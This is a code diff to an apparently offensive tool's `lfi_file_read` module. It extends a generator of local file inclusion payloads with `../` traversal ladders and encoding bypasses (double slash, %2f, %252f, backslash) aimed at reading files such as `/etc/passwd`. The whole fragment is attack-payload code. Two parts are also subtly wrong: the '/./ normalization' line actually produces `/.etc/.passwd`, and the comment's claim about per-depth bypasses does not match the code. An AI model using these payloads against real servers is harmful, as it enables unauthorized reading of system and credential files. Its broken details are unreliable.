@@ -32,12 +32,25 @@ ENCODE = [
 ]
 
 def _depths(path, is_abs):
-    """Build depth ladder for relative traversal."""
-    if is_abs or path.startswith(("php://", "file://")):
+    """Build depth ladder for relative traversal.
+    V12 (audit 3.3): absolute paths returned [path] alone — the 10
+    encodings had no `../` to transform, so every bypass was a no-op and
+    `/etc/passwd` shipped RAW ten times. Absolute paths now also carry
+    the path-style encodings (leading-slash, double-slash, pct)."""
+    if path.startswith(("php://", "file://")):
         return [path]
     out = []
-    for n in range(1, 9):
-        out.append("../" * n + path.lstrip("./"))
+    if not is_abs:
+        for n in range(1, 9):
+            out.append("../" * n + path.lstrip("./"))
+    # V12: absolute-path bypass ladder (applies to abs AND to every
+    # relative depth so both get the same shot)
+    out.append(path)
+    out.append("//" + path.lstrip("/"))                      # double-slash root
+    out.append(path.replace("/", "%2f"))                     # pct slashes
+    out.append(path.replace("/", "%252f"))                   # double-pct
+    out.append(path.replace("/", "/."))                      # /./ normalization
+    out.append(path.replace("/", "\\"))                      # backslash variant
     return out
 
 @register(name="lfi_file_read",
